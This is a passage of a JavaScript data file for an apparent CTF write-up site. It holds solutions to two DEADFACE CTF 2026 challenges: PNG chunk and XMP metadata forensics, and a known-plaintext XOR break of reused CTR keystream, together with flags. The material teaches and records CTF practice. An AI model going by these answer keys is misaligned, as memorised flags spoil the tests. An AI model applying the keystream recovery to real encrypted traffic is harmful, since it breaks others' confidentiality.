        text: 'The Turla Museum received five Cyber Impressionism paintings back from an institutional loan. Intelligence indicated that DEADFACE operatives swapped one authentic piece with an illicit forgery. All five works were digitized into the museum archive, and the forger reportedly left signatures in the digital record.'
      },
      {
        type: 'code',
        code: `Challenge Details:
Title:        Art Heist: The Forgery
Competition:  DEADFACE CTF 2026
Category:     Forensics
Artifact:     CTF_Forgery_Paintings.zip (SHA256: f4d4d118...cb12)
Files:        Painting_001.png to Painting_005.png`
      },
      {
        type: 'paragraph',
        text: 'Because the challenge brief pointed directly at digital file records rather than pixel-level manipulation, the investigation prioritized container metadata, modification timestamps, and PNG chunk structures over traditional steganography.'
      },
      {
        type: 'heading',
        text: '2. Step 1: File Properties & Outlier Detection'
      },
      {
        type: 'paragraph',
        text: 'Unpacking the archive revealed five high-resolution PNG images. Comparing file attributes immediately highlighted a chronological anomaly: while four files retained modification timestamps of September 2, Painting_002.png had been modified on October 15.'
      },
      {
        type: 'file',
        src: '/assets/CTF_Forgery_Paintings.zip',
        filename: 'CTF_Forgery_Paintings.zip',
        label: 'Download CTF_Forgery_Paintings.zip (Challenge Artifacts Archive)',
        caption: 'Challenge Archive: CTF_Forgery_Paintings.zip (Contains Painting_001.png to Painting_005.png)'
      },
      {
        type: 'heading',
        text: '3. Step 2: PNG Chunk Structure Walk'
      },
      {
        type: 'paragraph',
        text: 'Using a Python script, we parsed the raw binary chunk headers of all five PNG images (excluding IDAT image data streams) to compare chunk topologies and metadata payloads:'
      },
      {
        type: 'code',
        code: `import struct, glob

for f in sorted(glob.glob('*.png')):
    d = open(f, 'rb').read()
    p = 8
    print(f)
    while p < len(d):
        l, t = struct.unpack('>I4s', d[p:p+8])
        if t != b'IDAT':
            print(' ', t, l, d[p+8:p+8+min(l, 200)] if t != b'IHDR' else '')
        p += 12 + l
    print(' trailing bytes:', len(d) - p)`
      },
      {
        type: 'paragraph',
        text: 'Structural Comparison Matrix:\n• Paintings 001, 003, 004, 005: Software tag: "Atelier Archive", no extra chunks, XMP size: 934–953 bytes.\n• Painting 002: Software tag: "LAMIA Restoration Utility 0.0.13", comment: "checksum mismatch; palette recovered from cache", XMP size: 1428 bytes (~500 bytes larger than authentic scans).'
      },
      {
        type: 'heading',
        text: '4. Step 3: Extracting the Embedded XMP Packet'
      },
      {
        type: 'paragraph',
        text: 'Inspecting the expanded iTXt (XML:com.adobe.xmp) chunk inside Painting_002.png surfaced the complete provenance record altered by the forger:'
      },
      {
        type: 'code',
        code: `Extracted XMP Metadata (Painting_002.png):
• dc:creator     : Leonardo da Vinci / LAMIA
• dc:title       : Mona Lisa Loading
• dc:description : Authenticity status: pending. Restoration log incomplete.
• dc:rights      : LAMIA temporary acquisition
• dc:identifier  : deadface{L4MIA_SIGNS_HER_WORK}
• xmp:CreateDate : 1503-04-01 (backdated vanity timestamp)
• xmp:ModifyDate : 2026-09-01`
      },
      {
        type: 'paragraph',
        text: 'The flag was permanently stamped into the Dublin Core identifier (dc:identifier) tag, confirming LAMIA\'s signature.'
      },
      {
        type: 'heading',
        text: '5. Key Takeaways & Tools'
      },
      {
        type: 'paragraph',
        text: '• Metadata First: Always verify embedded container metadata and chunk structures before applying complex pixel steganography tools.\n• Baseline Outlier Analysis: When given a set of similar assets, the altered file almost always exhibits distinct signatures: different tooling, abnormal packet sizes, and inconsistent timestamps.\n• Command-line alternative: exiftool -a -G1 Painting_*.png extracts these identical Dublin Core fields in a single execution.'
      },
      {
        type: 'code',
        code: `deadface{L4MIA_SIGNS_HER_WORK}`
      }
    ]
  },
  {
    id: 'deadface-second-shift',
    slug: 'deadface-second-shift',
    title: 'Second Shift – Writeup',
    platform: 'DEADFACE CTF',
    category: 'Cryptography',
    difficulty: 'Medium',
    date: 'Oct 2026',
    readTime: '6 min read',
    os: 'Relay Server Artifacts / Python',
    osLabel: 'CHALLENGE ARTIFACTS',
    ip: 'Offline / Cryptanalysis',
    ipLabel: 'ENVIRONMENT',
    status: 'Solved',
    tags: ['DEADFACE CTF', 'Cryptography', 'Forensics', 'Known-Plaintext', 'CTR Mode', 'Nonce Reuse', 'Stream Cipher'],
    excerpt: 'ZeroTrace recovered files from a DEADFACE relay server with preserved heartbeat and encrypted tasking transmissions. By exploiting stream cipher / CTR keystream reuse with a known plaintext, we recovered the tasking message and flag.',
    userFlag: 'deadface{ctr_nonce_reuse_breaks_confidentiality}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview'
      },
      {
        type: 'paragraph',
        text: 'ZeroTrace recovered files from a DEADFACE relay server. One routine transmission was preserved both before and after processing by the relay (plaintext and ciphertext). A second outbound transmission was recovered only in its processed (encrypted) form. The objective is to determine what DEADFACE was preparing to do next and recover the flag.'
      },
      {
        type: 'code',
        code: `Archive SHA256: f04061f4077464448ecd40446543b1262bdc79cca8b01544880c62486a3c3a70 (verified)`
      },
      {
        type: 'heading',
        text: '2. Provided Artifacts'
      },
      {
        type: 'paragraph',
        text: 'The challenge archive contained three key files recovered from the relay server:'
      },
      {
        type: 'paragraph',
        text: '• relay-heartbeat.json – 251-byte plaintext heartbeat message\n• relay-heartbeat.enc – 250-byte ciphertext of that heartbeat\n• relay-tasking.enc – 220-byte ciphertext of an unknown tasking message'
      },
      {
        type: 'file',
        src: '/assets/secondshift.zip',
        filename: 'secondshift.zip',
        label: 'Download secondshift.zip (Challenge Artifacts Archive)',
        caption: 'Challenge Archive: secondshift.zip (Contains relay-heartbeat.json, relay-heartbeat.enc, relay-tasking.enc)'
      },
      {
        type: 'heading',
        text: '3. Technical Analysis'
      },
      {
        type: 'paragraph',
        text: '1. The heartbeat plaintext is JSON beginning with {"type":"heartbeat","host":"relay-07","user":"mort1cia",....\n2. Comparing the two ciphertexts, the first 9 bytes are identical (16b7a1339fab356aef). Both plaintexts begin with {"type":" — identical plaintext prefix gives identical ciphertext prefix, which strongly indicates a stream cipher or CTR mode construction where the exact same keystream was reused for both messages (reused key + nonce / IV).\n3. Later bytes (e.g., c810196a) also match at the exact same offsets, perfectly consistent with shared plaintext structural patterns under an identical keystream.\n4. The prompt\'s central clue is that one message exists in both plaintext and ciphertext form: a classic known-plaintext attack scenario.'
      },
      {
        type: 'heading',
        text: '4. Mathematical Solution & Exploit'
      },
      {
        type: 'paragraph',
        text: 'In any stream cipher or block cipher running in Counter (CTR) mode, ciphertext is generated by XORing the plaintext with a pseudorandom keystream:\nC = P ⊕ K\n\nGiven the known pair (P_heartbeat, C_heartbeat), the keystream is recovered directly:\nK = C_heartbeat ⊕ P_heartbeat\n\nBecause the keystream was reused across transmissions, the second ciphertext decrypts directly with the recovered K:\nP_tasking = C_tasking ⊕ K'
      },
      {
        type: 'code',
        code: `a = open('relay-heartbeat.enc', 'rb').read()
b = open('relay-tasking.enc', 'rb').read()
p = open('relay-heartbeat.json', 'rb').read()

k = bytes(x ^ y for x, y in zip(a, p))
print(bytes(x ^ y for x, y in zip(b, k)))`
      },
      {
        type: 'paragraph',
        text: 'The 220-byte tasking message is shorter than the recovered keystream (250 bytes), allowing complete decryption of the payload.'
      },
      {
        type: 'heading',
        text: '5. Decrypted Payload & Operations'
      },
      {
        type: 'code',
        code: `{"type":"tasking","target":"aurora-vpn","action":"stage-access","window":"00:30Z","operator":"mort1cia","note":"Use the backup tunnel. Archive bundle under DEADFACE{ctr_nonce_reuse_breaks_confidentiality} before exfil."}`
      },
      {
        type: 'paragraph',
        text: 'What DEADFACE was preparing to do next:\nmort1cia was tasked to stage access to aurora-vpn during the 00:30Z operational window, utilize the backup tunnel, and archive the gathered data bundle under the flag before final exfiltration.'
      },
      {
        type: 'heading',
        text: '6. Takeaways & Remediation'
      },
      {
        type: 'paragraph',
        text: '• Stream Cipher Nonce Reuse: Reusing a key/nonce pair in CTR mode or any stream cipher forces all messages to share one keystream. A single known plaintext completely compromises the confidentiality of all other messages encrypted under that keystream (and XORing two ciphertexts eliminates the keystream entirely).\n• Cryptographic Fix: Always ensure a cryptographically unique nonce/IV per message, or use modern authenticated encryption (AEAD) such as AES-GCM or ChaCha20-Poly1305 with fresh nonces.\n• Note on file length: The heartbeat plaintext is 251 bytes while the ciphertext is 250; the one-byte difference was due to a trailing newline in the plaintext file.'
      },
      {
        type: 'code',
        code: `deadface{ctr_nonce_reuse_breaks_confidentiality}`
      }
    ]
  }
];

export const WRITEUP_CATEGORIES = [
  {
    id: 'packetcapture-ctf-2026',
    slug: 'packetcapture-ctf-2026',
    name: 'PacketCapture CTF 2026',
    platform: 'PacketCapture CTF',
    description: 'Expert & medium forensics, OSINT, cryptography, steganography, and reverse engineering challenges.',
    year: '2026'
  },
  {
    id: 'pointer-overflow-ctf-2026',
    slug: 'pointer-overflow-ctf-2026',
    name: 'Pointer Overflow CTF 2026',
    platform: 'Pointer Overflow CTF 2026',
    description: 'University of Wisconsin - Stevens Point academic CTF. Reverse engineering, web exploitation, and stego.',
    year: '2026'
  },
  {
    id: 'deadface-ctf',
    slug: 'deadface-ctf',
    name: 'DEADFACE CTF',
    platform: 'DEADFACE CTF',
    description: 'Cybersecurity challenges spanning web exploitation, cryptography, forensic steganography, and traffic analysis.',
    year: '2026'
  }
];

export function getCategoryForPlatform(platform) {
  if (!platform) return WRITEUP_CATEGORIES[0];
  const pLower = platform.toLowerCase();
  return (
    WRITEUP_CATEGORIES.find(
      (c) =>
        c.platform.toLowerCase() === pLower ||
        c.name.toLowerCase() === pLower ||
        c.slug.toLowerCase() === pLower ||
        pLower.includes(c.platform.toLowerCase()) ||
        c.platform.toLowerCase().includes(pLower)
    ) || WRITEUP_CATEGORIES[0]
  );
}

export function getCategoryBySlug(slug) {
  if (!slug) return WRITEUP_CATEGORIES[0];
  const sLower = slug.toLowerCase();
  return (
    WRITEUP_CATEGORIES.find(
      (c) =>
        c.slug.toLowerCase() === sLower ||
        c.id.toLowerCase() === sLower ||
        c.name.toLowerCase() === sLower ||
        c.platform.toLowerCase() === sLower
    ) || WRITEUP_CATEGORIES[0]
  );
}

export function getWriteupsByCategory(categorySlugOrName, allWriteups = writeups) {
  const cat = getCategoryBySlug(categorySlugOrName);
  return allWriteups.filter(
    (w) =>
      w.platform?.toLowerCase() === cat.platform.toLowerCase() ||
      w.platform?.toLowerCase() === cat.name.toLowerCase()
  );
}

